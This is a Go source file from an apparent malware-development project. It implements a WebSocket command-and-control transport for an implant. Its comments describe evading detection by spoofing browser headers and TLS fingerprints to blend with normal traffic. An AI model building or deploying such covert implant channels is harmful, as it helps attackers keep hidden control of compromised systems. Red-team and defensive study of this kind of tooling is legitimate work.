package websocket

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"

	cws "github.com/coder/websocket"
	utls "github.com/refraction-networking/utls"

	"github.com/oioio-space/maldev/c2/transport"
)

// Transport is the dial-side WebSocket implant primitive. It
// satisfies [github.com/oioio-space/maldev/c2/transport.Transport]
// so a Router can fall over to / from a WS channel like any other
// backend.
//
// Concurrency: a single Transport is mono-conn; the Router
// serialises Read/Write via its own mutex. Close releases the local
// mutex BEFORE invoking the WS close frame to avoid stalling
// concurrent readers behind a slow TLS close_notify (lesson from
// the Router /simplify pass).
type Transport struct {
	url     string
	cfg     dialConfig
	timeout time.Duration

	mu     sync.Mutex
	conn   net.Conn  // websocket.NetConn(...) wrapper — byte-stream
	wsConn *cws.Conn // kept for typed close frame
	closed bool
}

type dialConfig struct {
	subprotocols []string
	header       http.Header
	tlsCfg       *tls.Config
	utlsCfg      *utls.Config
	utlsHello    utls.ClientHelloID
	useUTLS      bool
	compression  cws.CompressionMode
	timeout      time.Duration
}

// DialOption tunes [NewWebSocket].
type DialOption func(*dialConfig)

// WithSubprotocols pins the WS Sec-WebSocket-Protocol values offered
// at handshake. Operators use this to fingerprint their own traffic
// (e.g. "c2.v1") or to mimic a real app's subprotocol.
func WithSubprotocols(subs ...string) DialOption {
	return func(c *dialConfig) { c.subprotocols = subs }
}

// WithHeader adds a custom HTTP header to the upgrade request.
// Typical use: realistic User-Agent / Origin / Cookie to blend with
// browser WebSocket traffic.
func WithHeader(key, value string) DialOption {
	return func(c *dialConfig) {
		if c.header == nil {
			c.header = http.Header{}
		}
		c.header.Add(key, value)
	}
}

// WithTLSConfig sets a plain stdlib *tls.Config used for the
// underlying TLS handshake when dialling wss://. Mutually exclusive
// with [WithUTLSConfig] — uTLS wins if both are set.
func WithTLSConfig(cfg *tls.Config) DialOption {
	return func(c *dialConfig) { c.tlsCfg = cfg }
}

// WithUTLSConfig routes the TLS handshake through
// [github.com/oioio-space/maldev/c2/transport.UTLSDialer] with the
// supplied utls config and ClientHelloID. The WS upgrade then rides
// on a Chrome/Firefox/etc JA3 fingerprint. Use for wss:// channels
// that must blend with browser traffic.
func WithUTLSConfig(cfg *utls.Config, hello utls.ClientHelloID) DialOption {
	return func(c *dialConfig) {
		c.utlsCfg = cfg
		c.utlsHello = hello
		c.useUTLS = true
	}
}

// WithCompression toggles permessage-deflate. Default is on, which
// matches Chrome's behaviour; turning it off creates a fingerprint
// anomaly for traffic analysts.
func WithCompression(enabled bool) DialOption {
	return func(c *dialConfig) {
		if enabled {
			c.compression = cws.CompressionContextTakeover
		} else {
			c.compression = cws.CompressionDisabled
		}
	}
}

// WithDialTimeout bounds the TCP + TLS phase of the dial. Defaults
// to 30s, aligned with [github.com/oioio-space/maldev/c2/transport.NewUTLS].
func WithDialTimeout(d time.Duration) DialOption {
	return func(c *dialConfig) { c.timeout = d }
}

// NewWebSocket builds a dial-side WebSocket Transport. rawURL is the
// full ws:// or wss:// URL (scheme determines whether TLS is layered
// in).
func NewWebSocket(rawURL string, opts ...DialOption) *Transport {
	cfg := dialConfig{
		compression: cws.CompressionContextTakeover,
		timeout:     30 * time.Second,
	}
	for _, opt := range opts {
		opt(&cfg)
	}
	return &Transport{url: rawURL, cfg: cfg, timeout: cfg.timeout}
}

// Connect performs the WS handshake. Closes any existing conn first.
func (t *Transport) Connect(ctx context.Context) error {
	t.mu.Lock()
	if t.closed {
		t.mu.Unlock()
		return io.ErrClosedPipe
	}
	prev := t.wsConn
	t.wsConn = nil
	t.conn = nil
	t.mu.Unlock()
	if prev != nil {
		_ = prev.Close(cws.StatusNormalClosure, "")
	}

	httpClient := &http.Client{Timeout: 0}
	switch {
	case t.cfg.useUTLS:
		httpClient.Transport = &http.Transport{
			DialTLSContext: transport.UTLSDialer(t.cfg.utlsCfg, t.cfg.utlsHello, t.timeout),
		}
	case t.cfg.tlsCfg != nil:
		httpClient.Transport = &http.Transport{TLSClientConfig: t.cfg.tlsCfg}
	}

	dialOpts := &cws.DialOptions{
		HTTPClient:      httpClient,
		Subprotocols:    t.cfg.subprotocols,
		HTTPHeader:      t.cfg.header,
		CompressionMode: t.cfg.compression,
	}

	dialCtx, cancel := context.WithTimeout(ctx, t.timeout)
	defer cancel()
	wsConn, _, err := cws.Dial(dialCtx, t.url, dialOpts)
	if err != nil {
		return fmt.Errorf("ws dial %s: %w", t.url, err)
	}

	netConn := cws.NetConn(context.Background(), wsConn, cws.MessageBinary)

	t.mu.Lock()
	t.wsConn = wsConn
	t.conn = netConn
	t.mu.Unlock()
	return nil
}

// Read delegates to the byte-stream wrapper.
func (t *Transport) Read(p []byte) (int, error) {
	t.mu.Lock()
	c := t.conn
	t.mu.Unlock()
	if c == nil {
		return 0, io.ErrClosedPipe
	}
	return c.Read(p)
}

// Write delegates to the byte-stream wrapper.
func (t *Transport) Write(p []byte) (int, error) {
	t.mu.Lock()
	c := t.conn
	t.mu.Unlock()
	if c == nil {
		return 0, io.ErrClosedPipe
	}
	return c.Write(p)
}

// Close terminates the channel. Idempotent. Releases the mutex
// BEFORE the close frame so concurrent Read/Write callers don't
// stall behind a slow TLS close_notify.
func (t *Transport) Close() error {
	t.mu.Lock()
	if t.closed {
		t.mu.Unlock()
		return nil
	}
	t.closed = true
	ws := t.wsConn
	t.wsConn = nil
	t.conn = nil
	t.mu.Unlock()
	if ws != nil {
		return ws.Close(cws.StatusNormalClosure, "")
	}
	return nil
}

// RemoteAddr returns the remote URL as a synthetic net.Addr.
func (t *Transport) RemoteAddr() net.Addr { return wsAddr(t.url) }

type wsAddr string

func (a wsAddr) Network() string { return "websocket" }
func (a wsAddr) String() string  { return string(a) }
